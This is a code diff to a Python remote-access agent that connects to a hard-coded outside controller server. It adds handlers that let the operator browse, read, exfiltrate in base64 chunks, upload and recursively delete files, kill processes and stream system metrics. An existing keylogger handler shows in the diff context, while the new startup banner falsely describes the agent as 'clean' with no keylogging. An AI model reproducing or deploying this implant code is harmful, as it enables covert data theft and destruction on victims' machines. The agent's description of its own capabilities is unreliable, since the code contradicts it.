@@ -15,7 +15,10 @@ import time
 import uuid
 import psutil
 import json
+import base64
+import io
 from datetime import datetime
+from pathlib import Path
 
 # Configuration - connects to your existing controller
 SERVER_URL = "https://agent-controller-backend.onrender.com"
@@ -30,6 +33,13 @@ sio = socketio.Client(
     reconnection_delay=5,
     reconnection_delay_max=30
 )
+
+# Streaming state
+streaming_active = {
+    'screen': False,
+    'system': False
+}
+streaming_threads = {}
 
 # Agent information
 AGENT_INFO = {
@@ -447,6 +457,531 @@ def on_start_keylogger(data):
     except Exception as e:
         log(f"Error handling keylogger: {e}")
 
+# ============================================================================
+# FILE MANAGEMENT
+# ============================================================================
+
+@sio.on('list_files')
+def on_list_files(data):
+    """List files in a directory"""
+    try:
+        agent_id = data.get('agent_id', '')
+        if agent_id and agent_id != AGENT_ID:
+            return
+        
+        path = data.get('path', os.path.expanduser('~'))
+        
+        files = []
+        try:
+            path_obj = Path(path)
+            if not path_obj.exists():
+                raise FileNotFoundError(f"Path not found: {path}")
+            
+            for item in path_obj.iterdir():
+                try:
+                    stat = item.stat()
+                    files.append({
+                        'name': item.name,
+                        'path': str(item),
+                        'type': 'directory' if item.is_dir() else 'file',
+                        'size': stat.st_size if item.is_file() else 0,
+                        'modified': stat.st_mtime,
+                        'permissions': oct(stat.st_mode)[-3:]
+                    })
+                except Exception as e:
+                    log(f"Error reading item {item}: {e}")
+            
+            sio.emit('file_list', {
+                'agent_id': AGENT_ID,
+                'path': str(path_obj),
+                'files': files,
+                'success': True
+            })
+            
+        except Exception as e:
+            sio.emit('file_list', {
+                'agent_id': AGENT_ID,
+                'path': path,
+                'files': [],
+                'success': False,
+                'error': str(e)
+            })
+            
+    except Exception as e:
+        log(f"Error listing files: {e}")
+
+@sio.on('read_file')
+def on_read_file(data):
+    """Read file contents"""
+    try:
+        agent_id = data.get('agent_id', '')
+        if agent_id and agent_id != AGENT_ID:
+            return
+        
+        file_path = data.get('path', '')
+        max_size = 1024 * 1024  # 1MB max for text files
+        
+        try:
+            path_obj = Path(file_path)
+            if not path_obj.exists():
+                raise FileNotFoundError(f"File not found: {file_path}")
+            
+            if path_obj.stat().st_size > max_size:
+                raise ValueError(f"File too large (max {max_size} bytes)")
+            
+            with open(path_obj, 'r', encoding='utf-8', errors='ignore') as f:
+                content = f.read()
+            
+            sio.emit('file_content', {
+                'agent_id': AGENT_ID,
+                'path': str(path_obj),
+                'content': content,
+                'success': True
+            })
+            
+        except Exception as e:
+            sio.emit('file_content', {
+                'agent_id': AGENT_ID,
+                'path': file_path,
+                'content': '',
+                'success': False,
+                'error': str(e)
+            })
+            
+    except Exception as e:
+        log(f"Error reading file: {e}")
+
+@sio.on('download_file')
+def on_download_file(data):
+    """Download file (send in chunks)"""
+    try:
+        agent_id = data.get('agent_id', '')
+        if agent_id and agent_id != AGENT_ID:
+            return
+        
+        file_path = data.get('filename', '') or data.get('path', '')
+        chunk_size = 64 * 1024  # 64KB chunks
+        
+        try:
+            path_obj = Path(file_path)
+            if not path_obj.exists():
+                raise FileNotFoundError(f"File not found: {file_path}")
+            
+            if not path_obj.is_file():
+                raise ValueError(f"Not a file: {file_path}")
+            
+            file_size = path_obj.stat().st_size
+            
+            with open(path_obj, 'rb') as f:
+                offset = 0
+                while True:
+                    chunk = f.read(chunk_size)
+                    if not chunk:
+                        break
+                    
+                    # Encode chunk to base64
+                    chunk_b64 = base64.b64encode(chunk).decode('utf-8')
+                    
+                    sio.emit('file_chunk_from_agent', {
+                        'agent_id': AGENT_ID,
+                        'filename': path_obj.name,
+                        'chunk': chunk_b64,
+                        'offset': offset,
+                        'total_size': file_size
+                    })
+                    
+                    offset += len(chunk)
+                    time.sleep(0.01)  # Small delay to avoid overwhelming
+            
+            log(f"File download complete: {file_path} ({file_size} bytes)")
+            
+        except Exception as e:
+            sio.emit('file_chunk_from_agent', {
+                'agent_id': AGENT_ID,
+                'filename': file_path,
+                'error': str(e)
+            })
+            
+    except Exception as e:
+        log(f"Error downloading file: {e}")
+
+@sio.on('upload_file_chunk')
+def on_upload_file_chunk(data):
+    """Receive file upload chunk"""
+    try:
+        agent_id = data.get('agent_id', '')
+        if agent_id and agent_id != AGENT_ID:
+            return
+        
+        filename = data.get('filename', '')
+        chunk_b64 = data.get('data', '')
+        offset = data.get('offset', 0)
+        destination = data.get('destination_path', '')
+        
+        # Decode chunk
+        chunk = base64.b64decode(chunk_b64)
+        
+        # Determine file path
+        if destination:
+            file_path = Path(destination) / filename
+        else:
+            file_path = Path.home() / 'Downloads' / filename
+        
+        # Create directory if needed
+        file_path.parent.mkdir(parents=True, exist_ok=True)
+        
+        # Write chunk
+        mode = 'ab' if offset > 0 else 'wb'
+        with open(file_path, mode) as f:
+            f.write(chunk)
+        
+    except Exception as e:
+        log(f"Error uploading file chunk: {e}")
+
+@sio.on('upload_file_end')
+def on_upload_file_end(data):
+    """File upload complete"""
+    try:
+        agent_id = data.get('agent_id', '')
+        if agent_id and agent_id != AGENT_ID:
+            return
+        
+        filename = data.get('filename', '')
+        destination = data.get('destination_path', '')
+        
+        if destination:
+            file_path = Path(destination) / filename
+        else:
+            file_path = Path.home() / 'Downloads' / filename
+        
+        sio.emit('file_operation_result', {
+            'agent_id': AGENT_ID,
+            'operation': 'upload',
+            'file_path': str(file_path),
+            'success': True,
+            'file_size': file_path.stat().st_size if file_path.exists() else 0
+        })
+        
+        log(f"File upload complete: {file_path}")
+        
+    except Exception as e:
+        log(f"Error completing file upload: {e}")
+
+@sio.on('delete_file')
+def on_delete_file(data):
+    """Delete a file"""
+    try:
+        agent_id = data.get('agent_id', '')
+        if agent_id and agent_id != AGENT_ID:
+            return
+        
+        file_path = data.get('path', '')
+        
+        try:
+            path_obj = Path(file_path)
+            if path_obj.exists():
+                if path_obj.is_file():
+                    path_obj.unlink()
+                elif path_obj.is_dir():
+                    import shutil
+                    shutil.rmtree(path_obj)
+                
+                sio.emit('file_operation_result', {
+                    'agent_id': AGENT_ID,
+                    'operation': 'delete',
+                    'file_path': str(path_obj),
+                    'success': True
+                })
+            else:
+                raise FileNotFoundError(f"Path not found: {file_path}")
+                
+        except Exception as e:
+            sio.emit('file_operation_result', {
+                'agent_id': AGENT_ID,
+                'operation': 'delete',
+                'file_path': file_path,
+                'success': False,
+                'error_message': str(e)
+            })
+            
+    except Exception as e:
+        log(f"Error deleting file: {e}")
+
+# ============================================================================
+# SYSTEM MONITORING
+# ============================================================================
+
+def get_detailed_system_info():
+    """Get comprehensive system information"""
+    try:
+        # CPU info
+        cpu_percent = psutil.cpu_percent(interval=1, percpu=True)
+        cpu_freq = psutil.cpu_freq()
+        cpu_count = psutil.cpu_count()
+        
+        # Memory info
+        mem = psutil.virtual_memory()
+        swap = psutil.swap_memory()
+        
+        # Disk info
+        disk_partitions = []
+        for partition in psutil.disk_partitions():
+            try:
+                usage = psutil.disk_usage(partition.mountpoint)
+                disk_partitions.append({
+                    'device': partition.device,
+                    'mountpoint': partition.mountpoint,
+                    'fstype': partition.fstype,
+                    'total': usage.total,
+                    'used': usage.used,
+                    'free': usage.free,
+                    'percent': usage.percent
+                })
+            except:
+                pass
+        
+        # Network info
+        net_io = psutil.net_io_counters()
+        net_connections = len(psutil.net_connections())
+        
+        # Process info
+        processes = []
+        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
+            try:
+                pinfo = proc.info
+                processes.append({
+                    'pid': pinfo['pid'],
+                    'name': pinfo['name'],
+                    'cpu': pinfo['cpu_percent'] or 0,
+                    'memory': pinfo['memory_percent'] or 0
+                })
+            except:
+                pass
+        
+        # Sort by CPU usage
+        processes.sort(key=lambda x: x['cpu'], reverse=True)
+        top_processes = processes[:10]
+        
+        return {
+            'cpu': {
+                'percent': sum(cpu_percent) / len(cpu_percent),
+                'per_core': cpu_percent,
+                'frequency': cpu_freq.current if cpu_freq else 0,
+                'count': cpu_count
+            },
+            'memory': {
+                'total': mem.total,
+                'available': mem.available,
+                'used': mem.used,
+                'percent': mem.percent,
+                'swap_total': swap.total,
+                'swap_used': swap.used,
+                'swap_percent': swap.percent
+            },
+            'disk': {
+                'partitions': disk_partitions
+            },
+            'network': {
+                'bytes_sent': net_io.bytes_sent,
+                'bytes_recv': net_io.bytes_recv,
+                'packets_sent': net_io.packets_sent,
+                'packets_recv': net_io.packets_recv,
+                'connections': net_connections
+            },
+            'processes': {
+                'total': len(processes),
+                'top': top_processes
+            },
+            'uptime': time.time() - psutil.boot_time()
+        }
+        
+    except Exception as e:
+        log(f"Error getting detailed system info: {e}")
+        return {}
+
+@sio.on('get_system_metrics')
+def on_get_system_metrics(data):
+    """Send detailed system metrics"""
+    try:
+        agent_id = data.get('agent_id', '')
+        if agent_id and agent_id != AGENT_ID:
+            return
+        
+        metrics = get_detailed_system_info()
+        
+        sio.emit('system_metrics', {
+            'agent_id': AGENT_ID,
+            'metrics': metrics,
+            'timestamp': time.time()
+        })
+        
+    except Exception as e:
+        log(f"Error sending system metrics: {e}")
+
+@sio.on('get_process_list')
+def on_get_process_list(data):
+    """Get detailed process list"""
+    try:
+        agent_id = data.get('agent_id', '')
+        if agent_id and agent_id != AGENT_ID:
+            return
+        
+        processes = []
+        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent', 'status', 'create_time']):
+            try:
+                pinfo = proc.info
+                processes.append({
+                    'pid': pinfo['pid'],
+                    'name': pinfo['name'],
+                    'cpu': pinfo['cpu_percent'] or 0,
+                    'memory': pinfo['memory_percent'] or 0,
+                    'status': pinfo['status'],
+                    'started': pinfo['create_time']
+                })
+            except:
+                pass
+        
+        sio.emit('process_list', {
+            'agent_id': AGENT_ID,
+            'processes': processes
+        })
+        
+    except Exception as e:
+        log(f"Error getting process list: {e}")
+
+@sio.on('kill_process')
+def on_kill_process(data):
+    """Kill a process by PID"""
+    try:
+        agent_id = data.get('agent_id', '')
+        if agent_id and agent_id != AGENT_ID:
+            return
+        
+        pid = data.get('pid')
+        
+        try:
+            proc = psutil.Process(pid)
+            proc_name = proc.name()
+            proc.terminate()
+            
+            # Wait up to 3 seconds for graceful termination
+            proc.wait(timeout=3)
+            
+            sio.emit('command_result', {
+                'agent_id': AGENT_ID,
+                'output': f'Process {proc_name} (PID {pid}) terminated successfully',
+                'success': True
+            })
+            
+        except psutil.NoSuchProcess:
+            sio.emit('command_result', {
+                'agent_id': AGENT_ID,
+                'output': f'Process with PID {pid} not found',
+                'success': False
+            })
+        except psutil.TimeoutExpired:
+            # Force kill if terminate didn't work
+            proc.kill()
+            sio.emit('command_result', {
+                'agent_id': AGENT_ID,
+                'output': f'Process {proc_name} (PID {pid}) force killed',
+                'success': True
+            })
+            
+    except Exception as e:
+        log(f"Error killing process: {e}")
+        sio.emit('command_result', {
+            'agent_id': AGENT_ID,
+            'output': f'Error killing process: {str(e)}',
+            'success': False
+        })
+
+# ============================================================================
+# STREAMING (Text-based metrics streaming)
+# ============================================================================
+
+def system_metrics_stream():
+    """Stream system metrics periodically"""
+    global streaming_active
+    
+    log("System metrics streaming started")
+    
+    try:
+        while streaming_active.get('system', False):
+            if sio.connected:
+                metrics = get_detailed_system_info()
+                
+                sio.emit('system_metrics_stream', {
+                    'agent_id': AGENT_ID,
+                    'metrics': metrics,
+                    'timestamp': time.time()
+                })
+            
+            time.sleep(2)  # Update every 2 seconds
+            
+    except Exception as e:
+        log(f"Error in system metrics stream: {e}")
+    finally:
+        streaming_active['system'] = False
+        log("System metrics streaming stopped")
+
+@sio.on('start_system_monitoring')
+def on_start_system_monitoring(data):
+    """Start streaming system metrics"""
+    global streaming_active, streaming_threads
+    
+    try:
+        agent_id = data.get('agent_id', '')
+        if agent_id and agent_id != AGENT_ID:
+            return
+        
+        if not streaming_active.get('system', False):
+            streaming_active['system'] = True
+            
+            thread = threading.Thread(target=system_metrics_stream, daemon=True)
+            thread.start()
+            streaming_threads['system'] = thread
+            
+            log("System monitoring started")
+            
+            sio.emit('command_result', {
+                'agent_id': AGENT_ID,
+                'output': 'System monitoring started - streaming metrics every 2 seconds',
+                'success': True
+            })
+        else:
+            sio.emit('command_result', {
+                'agent_id': AGENT_ID,
+                'output': 'System monitoring already active',
+                'success': True
+            })
+            
+    except Exception as e:
+        log(f"Error starting system monitoring: {e}")
+
+@sio.on('stop_system_monitoring')
+def on_stop_system_monitoring(data):
+    """Stop streaming system metrics"""
+    global streaming_active
+    
+    try:
+        agent_id = data.get('agent_id', '')
+        if agent_id and agent_id != AGENT_ID:
+            return
+        
+        streaming_active['system'] = False
+        
+        log("System monitoring stopped")
+        
+        sio.emit('command_result', {
+            'agent_id': AGENT_ID,
+            'output': 'System monitoring stopped',
+            'success': True
+        })
+        
+    except Exception as e:
+        log(f"Error stopping system monitoring: {e}")
+
 def heartbeat():
     """Send periodic heartbeat to controller"""
     while True:
@@ -504,7 +1039,7 @@ def status_update():
 def main():
     """Main entry point"""
     log("=" * 70)
-    log("Pure Agent - Connects to Original controller.py")
+    log("Pure Agent - Enhanced Edition")
     log("=" * 70)
     log(f"Agent ID: {AGENT_ID}")
     log(f"Hostname: {AGENT_INFO['hostname']}")
@@ -513,24 +1048,41 @@ def main():
     log(f"Server: {SERVER_URL}")
     log("=" * 70)
     log("")
-    log("✅ Features Available:")
-    log("  ✓ Command execution")
-    log("  ✓ System information")
-    log("  ✓ Process listing (via commands)")
-    log("  ✓ File browsing (via commands)")
-    log("  ✓ Network info (via commands)")
+    log("✅ Command Execution:")
+    log("  ✓ CMD commands (native Windows)")
+    log("  ✓ PowerShell commands (auto-detected)")
+    log("  ✓ Unix commands (auto-translated: ls→dir, pwd→cd, etc.)")
+    log("  ✓ Clean formatted output")
     log("")
-    log("❌ Features NOT Available (No Privilege Escalation):")
-    log("  ✗ Screen streaming")
-    log("  ✗ Camera streaming")
-    log("  ✗ Audio streaming")
+    log("✅ File Management:")
+    log("  ✓ Browse directories")
+    log("  ✓ Read file contents")
+    log("  ✓ Upload files")
+    log("  ✓ Download files")
+    log("  ✓ Delete files/folders")
+    log("")
+    log("✅ System Monitoring:")
+    log("  ✓ Real-time CPU/Memory/Disk metrics")
+    log("  ✓ Process list with details")
+    log("  ✓ Network statistics")
+    log("  ✓ System metrics streaming")
+    log("  ✓ Kill processes")
+    log("")
+    log("✅ Advanced Features:")
+    log("  ✓ Live system metrics stream (2-second updates)")
+    log("  ✓ Detailed per-core CPU stats")
+    log("  ✓ Disk partition information")
+    log("  ✓ Top processes by CPU/Memory")
+    log("")
+    log("❌ NOT Available (Ethical/Clean Agent):")
+    log("  ✗ Screen/Camera/Audio capture")
     log("  ✗ Keylogging")
     log("  ✗ UAC bypasses")
-    log("  ✗ Persistence")
+    log("  ✗ Persistence mechanisms")
     log("  ✗ Registry modifications")
     log("")
     log("This is a CLEAN agent - No UAC, No Persistence, No Escalation")
-    log("Compatible with original controller.py Socket.IO events")
+    log("Enhanced with File Management, Monitoring & Streaming!")
     log("")
     log("=" * 70)
     
